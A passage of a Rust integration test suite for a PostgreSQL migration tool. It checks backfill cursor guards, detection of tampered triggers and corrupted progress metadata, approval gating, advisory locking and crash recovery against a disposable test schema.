                        cursor_columns::text AS cursor_columns, guard_trigger, \
                        guard_installed, guard_cleaned, complete \
                   FROM \"{}\".schema_backfills WHERE backfill_id = $1",
                cfg.pg.meta_schema
            ),
            &[version.as_str().into()],
        )
        .await
        .expect("read interrupted progress");
    let last_cursor: String = progress.try_get("last_cursor").expect("last cursor JSON");
    let last_cursor: serde_json::Value =
        serde_json::from_str(&last_cursor).expect("last cursor is tagged JSON");
    assert_eq!(
        last_cursor,
        serde_json::json!([{"int64": "1"}, "b"]),
        "the first two lexicographic rows must commit atomically with their tuple checkpoint"
    );
    let end_cursor: String = progress.try_get("end_cursor").expect("end cursor JSON");
    assert_eq!(
        serde_json::from_str::<serde_json::Value>(&end_cursor).unwrap(),
        serde_json::json!([{"int64": "2"}, "b"])
    );
    let columns: String = progress
        .try_get("cursor_columns")
        .expect("cursorColumns JSON");
    assert_eq!(
        serde_json::from_str::<serde_json::Value>(&columns).unwrap(),
        serde_json::json!(["tenant_id", "id"])
    );
    assert!(progress.try_get::<_, bool>("guard_installed").unwrap());
    assert!(!progress.try_get::<_, bool>("guard_cleaned").unwrap());
    assert!(!progress.try_get::<_, bool>("complete").unwrap());
    let guard_trigger: String = progress.try_get("guard_trigger").expect("guard name");

    let guard_exists: bool = session
        .query_one(
            "SELECT EXISTS (SELECT 1 FROM pg_catalog.pg_trigger t \
                JOIN pg_catalog.pg_class c ON c.oid = t.tgrelid \
                JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace \
                WHERE n.nspname = $1 AND c.relname = 'guarded_items' \
                  AND t.tgname = $2 AND t.tgenabled = 'A') AS present",
            &[
                cfg.project_schema.as_str().into(),
                guard_trigger.as_str().into(),
            ],
        )
        .await
        .expect("inspect durable guard")
        .try_get("present")
        .expect("guard presence");
    assert!(guard_exists, "guard must survive the interrupted apply");

    let blocked = session
        .exec(
            &format!(
                "UPDATE \"{}\".guarded_items SET tenant_id = 9 \
                  WHERE tenant_id = 2 AND id = 'a'",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect_err("guard must reject changing any cursor component");
    assert!(blocked
        .to_string()
        .contains("cursor components are immutable"));

    session
        .exec(
            &format!(
                "INSERT INTO \"{}\".guarded_items (tenant_id, id, value) \
                 VALUES (9, 'new', 'already_done')",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("the established filter invariant permits a non-matching new row");

    backend
        .run_backfill_step(
            &cfg,
            &version,
            &checksum,
            &spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect("resume completes the original bounded cohort");

    let completed = session
        .query_one(
            &format!(
                "SELECT guard_installed, guard_cleaned, complete \
                   FROM \"{}\".schema_backfills WHERE backfill_id = $1",
                cfg.pg.meta_schema
            ),
            &[version.as_str().into()],
        )
        .await
        .expect("read completed progress");
    assert!(!completed.try_get::<_, bool>("guard_installed").unwrap());
    assert!(completed.try_get::<_, bool>("guard_cleaned").unwrap());
    assert!(completed.try_get::<_, bool>("complete").unwrap());

    let changed = session
        .exec(
            &format!(
                "UPDATE \"{}\".guarded_items SET tenant_id = 10 \
                  WHERE tenant_id = 2 AND id = 'a'",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("cursor updates are allowed after journaled guard cleanup");
    assert_eq!(changed, 1);
    let pending: i64 = session
        .query_one(
            &format!(
                "SELECT count(*) AS pending FROM \"{}\".guarded_items \
                  WHERE value = 'pending'",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .unwrap()
        .try_get("pending")
        .unwrap();
    assert_eq!(pending, 0);
    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn guard_detects_representation_changes_under_case_insensitive_cursor_semantics() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");
    session
        .batch(&format!(
            "CREATE EXTENSION citext WITH SCHEMA \"{schema}\"; \
             CREATE TABLE \"{schema}\".case_guard_items (\
                 amount numeric NOT NULL, event_day date NOT NULL, \
                 id uuid NOT NULL, label \"{schema}\".citext NOT NULL, \
                 value text NOT NULL, \
                 PRIMARY KEY (amount, event_day, id, label)\
             ); \
             INSERT INTO \"{schema}\".case_guard_items VALUES \
                 (1.25, DATE '2026-07-16', \
                  '00000000-0000-0000-0000-000000000001', 'a', 'pending')",
            schema = cfg.project_schema
        ))
        .await
        .expect("create case-insensitive composite cursor target");

    let version = MigrationId::generate();
    let checksum = step_checksum("representation-sensitive cursor guard");
    let spec = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "case_guard_items".into(),
        cursor_columns: vec![
            "amount".into(),
            "event_day".into(),
            "id".into(),
            "label".into(),
        ],
        cursor_stability: zero_migrate::CursorStability::GuardUpdates,
        cursor_contract: None,
        batch_size: 1,
        set_clause: "\"value\" = 'done'".into(),
        per_row: BTreeMap::new(),
        filter: Some("\"value\" = 'pending'".into()),
        name: "representation-sensitive cursor guard".into(),
    };
    zero_migrate::fault::arm(zero_migrate::fault::points::BACKFILL_MID_BATCHES, 0);
    let interrupted = backend
        .run_backfill_step(
            &cfg,
            &version,
            &checksum,
            &spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await;
    zero_migrate::fault::disarm_all();
    interrupted.expect_err("fault after the first committed batch");

    let blocked = session
        .exec(
            &format!(
                "UPDATE \"{}\".case_guard_items SET label = 'A' WHERE label = 'a'",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect_err("case-only cursor change must be blocked despite citext equality");
    assert!(
        blocked
            .to_string()
            .contains("cursor components are immutable"),
        "unexpected case-only guard failure: {blocked}"
    );

    backend
        .run_backfill_step(
            &cfg,
            &version,
            &checksum,
            &spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect("resume verifies then cleans up the representation-sensitive guard");
    assert_eq!(
        session
            .exec(
                &format!(
                    "UPDATE \"{}\".case_guard_items SET label = 'A' WHERE label = 'a'",
                    cfg.project_schema
                ),
                &[],
            )
            .await
            .expect("case-only update is accepted after durable completion"),
        1
    );

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn backfill_resume_rejects_a_when_false_guard_replacement() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");
    session
        .batch(&format!(
            "CREATE TABLE \"{}\".guard_tamper_items (\
                 id bigint PRIMARY KEY, value text NOT NULL\
             ); \
             INSERT INTO \"{}\".guard_tamper_items VALUES (1, 'pending')",
            cfg.project_schema, cfg.project_schema
        ))
        .await
        .expect("create guard-tamper target");

    let version = MigrationId::generate();
    let checksum = step_checksum("guard WHEN-clause tamper");
    let spec = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "guard_tamper_items".into(),
        cursor_columns: vec!["id".into()],
        cursor_stability: zero_migrate::CursorStability::GuardUpdates,
        cursor_contract: None,
        batch_size: 1,
        set_clause: "\"value\" = 'done'".into(),
        per_row: BTreeMap::new(),
        filter: Some("\"value\" = 'pending'".into()),
        name: "guard WHEN-clause tamper".into(),
    };
    zero_migrate::fault::arm(zero_migrate::fault::points::BACKFILL_MID_BATCHES, 0);
    let interrupted = backend
        .run_backfill_step(
            &cfg,
            &version,
            &checksum,
            &spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await;
    zero_migrate::fault::disarm_all();
    interrupted.expect_err("fault after the guarded batch commits");

    let obligation = session
        .query_one(
            &format!(
                "SELECT guard_trigger, guard_function, guard_marker \
                   FROM \"{}\".schema_backfills WHERE backfill_id = $1",
                cfg.pg.meta_schema
            ),
            &[version.as_str().into()],
        )
        .await
        .expect("read durable guard obligation");
    let trigger: String = obligation.try_get("guard_trigger").expect("guard trigger");
    let function: String = obligation
        .try_get("guard_function")
        .expect("guard function");
    let marker: String = obligation.try_get("guard_marker").expect("guard marker");
    session
        .batch(&format!(
            "DROP TRIGGER \"{trigger}\" ON \"{schema}\".guard_tamper_items; \
             CREATE TRIGGER \"{trigger}\" \
                 BEFORE UPDATE OF id ON \"{schema}\".guard_tamper_items \
                 FOR EACH ROW WHEN (false) \
                 EXECUTE FUNCTION \"{meta}\".\"{function}\"(); \
             ALTER TABLE \"{schema}\".guard_tamper_items \
                 ENABLE ALWAYS TRIGGER \"{trigger}\"; \
             COMMENT ON TRIGGER \"{trigger}\" ON \"{schema}\".guard_tamper_items \
                 IS '{marker}'",
            schema = cfg.project_schema,
            meta = cfg.pg.meta_schema,
        ))
        .await
        .expect("replace the guard with an inert lookalike");

    let error = backend
        .run_backfill_step(
            &cfg,
            &version,
            &checksum,
            &spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect_err("resume must reject an inert lookalike guard");
    assert!(
        error
            .to_string()
            .contains("cursor guard definition drifted"),
        "unexpected inert-guard drift error: {error}"
    );

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn backfill_resume_rejects_cursor_metadata_and_cohort_bound_corruption() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");
    session
        .batch(&format!(
            "CREATE TABLE \"{schema}\".bound_items (\
                 id bigint PRIMARY KEY, value text NOT NULL\
             ); \
             CREATE TABLE \"{schema}\".metadata_items (\
                 id bigint PRIMARY KEY, value text NOT NULL\
             ); \
             INSERT INTO \"{schema}\".bound_items VALUES \
                 (1, 'pending'), (2, 'pending'), (3, 'pending'); \
             INSERT INTO \"{schema}\".metadata_items VALUES \
                 (1, 'pending'), (2, 'pending'), (3, 'pending')",
            schema = cfg.project_schema
        ))
        .await
        .expect("create resume-drift targets");

    let bound_version = MigrationId::generate();
    let bound_checksum = step_checksum("cohort bound corruption");
    let bound_spec = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "bound_items".into(),
        cursor_columns: vec!["id".into()],
        cursor_stability: zero_migrate::CursorStability::GuardUpdates,
        cursor_contract: None,
        batch_size: 1,
        set_clause: "\"value\" = 'done'".into(),
        per_row: BTreeMap::new(),
        filter: Some("\"value\" = 'pending'".into()),
        name: "cohort bound corruption".into(),
    };
    zero_migrate::fault::arm(zero_migrate::fault::points::BACKFILL_MID_BATCHES, 0);
    let interrupted = backend
        .run_backfill_step(
            &cfg,
            &bound_version,
            &bound_checksum,
            &bound_spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await;
    zero_migrate::fault::disarm_all();
    interrupted.expect_err("fault after the first committed bound batch");
    session
        .exec(
            &format!(
                "UPDATE \"{}\".schema_backfills \
                    SET end_cursor = '[{{\"int64\":\"999\"}}]'::jsonb \
                  WHERE backfill_id = $1",
                cfg.pg.meta_schema
            ),
            &[bound_version.as_str().into()],
        )
        .await
        .expect("corrupt the durable cohort bound");
    let error = backend
        .run_backfill_step(
            &cfg,
            &bound_version,
            &bound_checksum,
            &bound_spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect_err("resume must reject a changed cohort bound");
    assert!(
        error
            .to_string()
            .contains("cohort-bound integrity checksum"),
        "unexpected cohort-bound drift error: {error}"
    );

    let metadata_version = MigrationId::generate();
    let metadata_checksum = step_checksum("cursor metadata corruption");
    let metadata_spec = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "metadata_items".into(),
        cursor_columns: vec!["id".into()],
        cursor_stability: zero_migrate::CursorStability::GuardUpdates,
        cursor_contract: None,
        batch_size: 1,
        set_clause: "\"value\" = 'done'".into(),
        per_row: BTreeMap::new(),
        filter: Some("\"value\" = 'pending'".into()),
        name: "cursor metadata corruption".into(),
    };
    zero_migrate::fault::arm(zero_migrate::fault::points::BACKFILL_MID_BATCHES, 0);
    let interrupted = backend
        .run_backfill_step(
            &cfg,
            &metadata_version,
            &metadata_checksum,
            &metadata_spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await;
    zero_migrate::fault::disarm_all();
    interrupted.expect_err("fault after the first committed metadata batch");
    session
        .exec(
            &format!(
                "UPDATE \"{}\".schema_backfills \
                    SET cursor_columns = '[\"other_id\"]'::jsonb \
                  WHERE backfill_id = $1",
                cfg.pg.meta_schema
            ),
            &[metadata_version.as_str().into()],
        )
        .await
        .expect("corrupt the durable cursor metadata");
    let error = backend
        .run_backfill_step(
            &cfg,
            &metadata_version,
            &metadata_checksum,
            &metadata_spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect_err("resume must reject changed cursor metadata");
    assert!(
        error.to_string().contains("progress cursorColumns drifted"),
        "unexpected cursor metadata drift error: {error}"
    );

    for table in ["bound_items", "metadata_items"] {
        let values = session
            .query(
                &format!(
                    "SELECT value FROM \"{}\".{table} ORDER BY id",
                    cfg.project_schema
                ),
                &[],
            )
            .await
            .expect("read interrupted target")
            .into_iter()
            .map(|row| row.try_get::<_, String>("value").expect("decode value"))
            .collect::<Vec<_>>();
        assert_eq!(
            values,
            ["done", "pending", "pending"],
            "a refused resume must not perform another batch"
        );
    }

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn backfill_rejects_a_progress_table_with_any_extra_stale_column() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");
    session
        .batch(&format!(
            "CREATE TABLE \"{}\".progress_shape_items (\
                 id bigint PRIMARY KEY, value text NOT NULL\
             ); \
             INSERT INTO \"{}\".progress_shape_items VALUES (1, 'pending')",
            cfg.project_schema, cfg.project_schema
        ))
        .await
        .expect("create progress-shape target");

    let initial_version = MigrationId::generate();
    let initial_checksum = step_checksum("bootstrap exact progress shape");
    let initial_spec = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "progress_shape_items".into(),
        cursor_columns: vec!["id".into()],
        cursor_stability: zero_migrate::CursorStability::ExternalInvariant {
            name: "progress_shape_items_id_immutable".into(),
        },
        cursor_contract: None,
        batch_size: 1,
        set_clause: "\"value\" = 'done'".into(),
        per_row: BTreeMap::new(),
        filter: Some("\"value\" = 'pending'".into()),
        name: "bootstrap exact progress shape".into(),
    };
    backend
        .run_backfill_step(
            &cfg,
            &initial_version,
            &initial_checksum,
            &initial_spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect("bootstrap the canonical progress table");

    session
        .batch(&format!(
            "ALTER TABLE \"{}\".schema_backfills ADD COLUMN stale_extra text; \
             UPDATE \"{}\".progress_shape_items SET value = 'pending'",
            cfg.pg.meta_schema, cfg.project_schema
        ))
        .await
        .expect("introduce a harmless-looking stale progress column");

    let rejected_version = MigrationId::generate();
    let rejected_checksum = step_checksum("reject stale progress shape");
    let mut rejected_spec = initial_spec;
    rejected_spec.name = "reject stale progress shape".into();
    let error = backend
        .run_backfill_step(
            &cfg,
            &rejected_version,
            &rejected_checksum,
            &rejected_spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect_err("an extra progress column is a stale pre-release layout");
    assert!(
        error
            .to_string()
            .contains("exact current pre-release schema"),
        "unexpected stale-layout error: {error}"
    );
    let value: String = session
        .query_one(
            &format!(
                "SELECT value FROM \"{}\".progress_shape_items WHERE id = 1",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read rejected target")
        .try_get("value")
        .expect("decode rejected target");
    assert_eq!(value, "pending", "shape rejection precedes target writes");
    let progress_rows: i64 = session
        .query_one(
            &format!(
                "SELECT count(*)::bigint AS n FROM \"{}\".schema_backfills \
                  WHERE backfill_id = $1",
                cfg.pg.meta_schema
            ),
            &[rejected_version.as_str().into()],
        )
        .await
        .expect("read rejected progress")
        .try_get("n")
        .expect("decode rejected progress count");
    assert_eq!(progress_rows, 0);

    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn external_cursor_invariant_requires_explicit_approval_and_is_recorded() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    let backend = PostgresBackend::new_generic(&session);
    backend.ensure_journal(&cfg).await.expect("ensure journal");
    session
        .batch(&format!(
            "CREATE TABLE \"{}\".external_items (id bigint PRIMARY KEY, value text); \
             INSERT INTO \"{}\".external_items VALUES (1, NULL), (2, NULL)",
            cfg.project_schema, cfg.project_schema
        ))
        .await
        .unwrap();
    let version = MigrationId::generate();
    let checksum = step_checksum("approved external cursor invariant");
    let spec = BackfillSpec {
        schema: cfg.project_schema.clone(),
        table: "external_items".into(),
        cursor_columns: vec!["id".into()],
        cursor_stability: zero_migrate::CursorStability::ExternalInvariant {
            name: "external_items_id_is_immutable".into(),
        },
        cursor_contract: None,
        batch_size: 1,
        set_clause: "\"value\" = 'done'".into(),
        per_row: BTreeMap::new(),
        filter: Some("\"value\" IS NULL".into()),
        name: "approved external cursor invariant".into(),
    };
    backend
        .run_backfill_step(
            &cfg,
            &version,
            &checksum,
            &spec,
            Approval::None,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect_err("external invariants cannot run without explicit approval");
    backend
        .run_backfill_step(
            &cfg,
            &version,
            &checksum,
            &spec,
            Approval::Approved,
            &ApprovalScope::All,
            "tester",
            LockMode::AlreadyHeld,
        )
        .await
        .expect("approved external invariant applies");
    let recorded: String = session
        .query_one(
            &format!(
                "SELECT cursor_stability::text AS stability \
                   FROM \"{}\".schema_backfills WHERE backfill_id = $1",
                cfg.pg.meta_schema
            ),
            &[version.as_str().into()],
        )
        .await
        .unwrap()
        .try_get("stability")
        .unwrap();
    assert_eq!(
        serde_json::from_str::<serde_json::Value>(&recorded).unwrap(),
        serde_json::json!({
            "mode": "externalInvariant",
            "name": "external_items_id_is_immutable"
        })
    );
    drop_schemas(&session, &cfg).await;
}

#[compio::test]
async fn online_rename_backfill_rejects_replica_only_and_body_tampered_dual_write_triggers() {
    use zero_migrate::driver::SqlSession;

    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;
    session
        .batch(&format!(
            "CREATE TABLE \"{}\".rename_guard_items (\
                 id bigint PRIMARY KEY, email text\
             ); \
             INSERT INTO \"{}\".rename_guard_items VALUES (1, 'a@example.test')",
            cfg.project_schema, cfg.project_schema
        ))
        .await
        .expect("create online-rename trigger proof target");

    let backend = PostgresBackend::new_generic(&session);
    let engine = MigrationEngine::new();
    let rename = ExpandContractAuthor::new(cfg.project_schema.clone(), "app_test")
        .author(&OnlineIntent::RenameColumn {
            table: "rename_guard_items".into(),
            from: "email".into(),
            to: "email_address".into(),
            ty: "text".into(),
        })
        .expect("author trigger-proof rename");
    let backfill_version = rename
        .expand
        .last()
        .expect("online rename has a backfill marker")
        .version
        .clone();
    let step = PlanStep::OnlineRename(RenameStep::PgExpandContract(rename));

    zero_migrate::fault::arm(
        zero_migrate::fault::points::EXPAND_BETWEEN_E2_AND_BACKFILL,
        0,
    );
    let interrupted = engine
        .apply_plan_with_touched_and_depends(
            std::slice::from_ref(&step),
            &["rename_guard_items".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await;
    zero_migrate::fault::disarm_all();
    interrupted.expect_err("fault after the managed dual-write trigger commits");

    let trigger = session
        .query_one(
            "SELECT t.tgname AS trigger_name, p.proname AS function_name \
               FROM pg_catalog.pg_trigger t \
               JOIN pg_catalog.pg_class c ON c.oid = t.tgrelid \
               JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace \
               JOIN pg_catalog.pg_proc p ON p.oid = t.tgfoid \
              WHERE n.nspname = $1 AND c.relname = 'rename_guard_items' \
                AND NOT t.tgisinternal",
            &[cfg.project_schema.as_str().into()],
        )
        .await
        .expect("read managed online-rename trigger");
    let trigger_name: String = trigger.try_get("trigger_name").expect("trigger name");
    let function_name: String = trigger.try_get("function_name").expect("function name");
    session
        .batch(&format!(
            "ALTER TABLE \"{}\".rename_guard_items \
                 ENABLE REPLICA TRIGGER \"{trigger_name}\"",
            cfg.project_schema
        ))
        .await
        .expect("make the dual-write trigger replica-only");
    let error = engine
        .apply_plan_with_touched_and_depends(
            std::slice::from_ref(&step),
            &["rename_guard_items".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect_err("replica-only dual-write is not a write invariant");
    assert!(
        error
            .to_string()
            .contains("proven zero-migrate dual-write shape"),
        "unexpected replica-only trigger error: {error}"
    );

    session
        .batch(&format!(
            "ALTER TABLE \"{schema}\".rename_guard_items \
                 ENABLE TRIGGER \"{trigger_name}\"; \
             CREATE OR REPLACE FUNCTION \"{schema}\".\"{function_name}\"() \
                 RETURNS trigger AS $$ BEGIN RETURN NEW; END $$ LANGUAGE plpgsql",
            schema = cfg.project_schema
        ))
        .await
        .expect("replace the managed function with a name-compatible lookalike");
    let error = engine
        .apply_plan_with_touched_and_depends(
            std::slice::from_ref(&step),
            &["rename_guard_items".into()],
            &[],
            Approval::Approved,
            &backend,
            &cfg,
            "app_test",
            LockMode::Acquire,
        )
        .await
        .expect_err("a zsdw-named function with the wrong body is unproven");
    assert!(
        error
            .to_string()
            .contains("proven zero-migrate dual-write shape"),
        "unexpected body-tamper trigger error: {error}"
    );

    let progress_rows: i64 = session
        .query_one(
            &format!(
                "SELECT count(*)::bigint AS n FROM \"{}\".schema_backfills \
                  WHERE backfill_id = $1",
                cfg.pg.meta_schema
            ),
            &[backfill_version.as_str().into()],
        )
        .await
        .expect("read rejected online-backfill progress")
        .try_get("n")
        .expect("decode progress count");
    assert_eq!(
        progress_rows, 0,
        "trigger proof must fail before cohort capture and progress insertion"
    );
    let copied: Option<String> = session
        .query_one(
            &format!(
                "SELECT email_address FROM \"{}\".rename_guard_items WHERE id = 1",
                cfg.project_schema
            ),
            &[],
        )
        .await
        .expect("read unmodified rename target")
        .try_get("email_address")
        .expect("decode shadow value");
    assert_eq!(
        copied, None,
        "an unproven trigger must prevent backfill writes"
    );

    drop_schemas(&session, &cfg).await;
}

// ---------------------------------------------------------------------------
// Scenario 1 — two-phase apply + pg_advisory_lock (transactional path)
// ---------------------------------------------------------------------------

#[compio::test]
async fn transactional_apply_creates_table_and_journals_completed() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let v = MigrationId::generate();
    let up = format!(
        "CREATE TABLE \"{}\".widgets (id bigint PRIMARY KEY, name text NOT NULL)",
        cfg.project_schema
    );
    let m = mig(v.clone(), "create_widgets", &up);

    let out = apply(
        &session,
        &cfg,
        std::slice::from_ref(&m),
        Approval::None,
        "app_test",
    )
    .await
    .expect("apply create_widgets");
    assert_eq!(
        out.applied,
        vec![v.as_str().to_string()],
        "one migration applied"
    );
    assert!(
        table_exists(&session, &cfg.project_schema, "widgets").await,
        "the migration's table was created against real PG"
    );

    // The journal recorded a completed event, readable back over the seam.
    let applied = zero_migrate::applied(&session, &cfg)
        .await
        .expect("journal read");
    assert_eq!(applied.len(), 1, "one journal row");
    assert_eq!(applied[0].version, v.as_str());
    assert_eq!(applied[0].checksum, m.checksum.as_str());

    // Idempotent re-run: no-op, no second row.
    let out2 = apply(
        &session,
        &cfg,
        std::slice::from_ref(&m),
        Approval::None,
        "app_test",
    )
    .await
    .expect("re-apply no-op");
    assert!(out2.is_noop(), "second apply is a no-op");
    let applied2 = zero_migrate::applied(&session, &cfg)
        .await
        .expect("journal re-read");
    assert_eq!(applied2.len(), 1, "no duplicate journal row on re-apply");

    drop_schemas(&session, &cfg).await;
}

/// The advisory lock is a real `pg_advisory_lock(hashtext(project_id))`: after an
/// apply the session holds NO advisory lock (acquire+release balanced), and while
/// held it appears in `pg_locks`.
#[compio::test]
async fn apply_acquires_and_releases_the_project_advisory_lock() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    use zero_migrate::driver::SqlSession;
    // Acquire directly through the shipped backend leaf, then confirm it is visible.
    let backend = PostgresBackend::new_generic(&session);
    backend.acquire_project_lock(&cfg).await.expect("acquire");
    let held = session
        .query_one(
            "SELECT count(*)::int8 AS n FROM pg_locks \
             WHERE locktype = 'advisory' AND pid = pg_backend_pid()",
            &[],
        )
        .await
        .expect("pg_locks probe");
    assert!(
        held.try_get::<_, i64>("n").expect("decode n") >= 1,
        "the project advisory lock is held after acquire_project_lock"
    );
    backend.release_project_lock(&cfg).await.expect("release");
    let after = session
        .query_one(
            "SELECT count(*)::int8 AS n FROM pg_locks \
             WHERE locktype = 'advisory' AND pid = pg_backend_pid()",
            &[],
        )
        .await
        .expect("pg_locks probe 2");
    assert_eq!(
        after.try_get::<_, i64>("n").expect("decode n"),
        0,
        "the advisory lock is released after release_project_lock"
    );

    drop_schemas(&session, &cfg).await;
}

// ---------------------------------------------------------------------------
// Scenario 2 — non-transactional two-phase apply + recovery
// ---------------------------------------------------------------------------

/// A non-transactional migration applies via the two-phase (`started` → run →
/// `completed`) path, and a lone `started` marker (a simulated crash before
/// `completed`) triggers the idempotent recovery on the next apply.
#[compio::test]
async fn non_transactional_two_phase_apply_and_recovery() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    // First, a base table (transactional).
    let v0 = MigrationId::generate();
    let base = mig(
        v0.clone(),
        "base",
        &format!(
            "CREATE TABLE \"{}\".items (id bigint PRIMARY KEY, tag text)",
            cfg.project_schema
        ),
    );
    apply(
        &session,
        &cfg,
        std::slice::from_ref(&base),
        Approval::None,
        "app_test",
    )
    .await
    .expect("apply base");

    // A non-txn idempotent CREATE INDEX CONCURRENTLY IF NOT EXISTS.
    let v1 = MigrationId::generate();
    let idx = mig_nontxn(
        v1.clone(),
        "idx_items_tag",
        &format!(
            "CREATE INDEX CONCURRENTLY IF NOT EXISTS items_tag_idx ON \"{}\".items (tag)",
            cfg.project_schema
        ),
    );
    let out = apply(
        &session,
        &cfg,
        &[base.clone(), idx.clone()],
        Approval::None,
        "app_test",
    )
    .await
    .expect("apply non-txn index");
    assert!(
        out.applied.contains(&v1.as_str().to_string()),
        "the non-txn migration applied via the two-phase path"
    );

    // Simulate a crash: write a lone `started` marker for a THIRD migration, then
    // re-apply the full set — the recovery path must clear it and re-run cleanly.
    let v2 = MigrationId::generate();
    let idx2 = mig_nontxn(
        v2.clone(),
        "idx_items_id",
        &format!(
            "CREATE INDEX CONCURRENTLY IF NOT EXISTS items_id_idx ON \"{}\".items (id)",
            cfg.project_schema
        ),
    );
    // Arm a `started` marker directly (the pre-crash phase-1 write).
    zero_migrate::record_started(
        &session,
        &cfg,
        v2.as_str(),
        "idx_items_id",
        idx2.checksum.as_str(),
        "app_test",
    )
    .await
    .expect("arm started marker");

    let out2 = apply(
        &session,
        &cfg,
        &[base.clone(), idx.clone(), idx2.clone()],
        Approval::None,
        "app_test",
    )
    .await
    .expect("re-apply drives recovery");
    // The version with the lone marker is recovered/completed on this run.
    assert!(
        out2.applied.contains(&v2.as_str().to_string())
            || out2.recovered.contains(&v2.as_str().to_string()),
        "the crashed non-txn migration was recovered + completed: {out2:?}"
    );
    let applied = zero_migrate::applied(&session, &cfg)
        .await
        .expect("journal read");
    assert!(
        applied.iter().any(|e| e.version == v2.as_str()),
        "the recovered version is now net-applied in the journal"
    );

    drop_schemas(&session, &cfg).await;
}

/// An inflight marker whose checksum disagrees with the supplied migration aborts
/// instead of replaying a different body.
///
/// The marker records the checksum of the body that half-ran. The tamper gate cannot
/// vet it, because `compare_applied_to_set` skips every non-completed entry, and the
/// recovery path never sees the marker at all - it only gets the migration now in the
/// set. So editing a `transaction:false` migration in place after it half-applied
/// used to re-run the edited body and then overwrite the marker, destroying the
/// evidence.
///
/// The recovery test above plants a marker whose checksum MATCHES, so the
/// disagreeing case had no coverage by construction.
#[compio::test]
async fn a_mismatched_inflight_marker_aborts_instead_of_replaying() {
    let url = skip_if_no_pg!();
    let session = PgDevSession::connect(&url);
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&session, &cfg).await;
    ensure_project_schema(&session, &cfg).await;

    let v0 = MigrationId::generate();
    let base = mig(
        v0.clone(),
        "base_items",
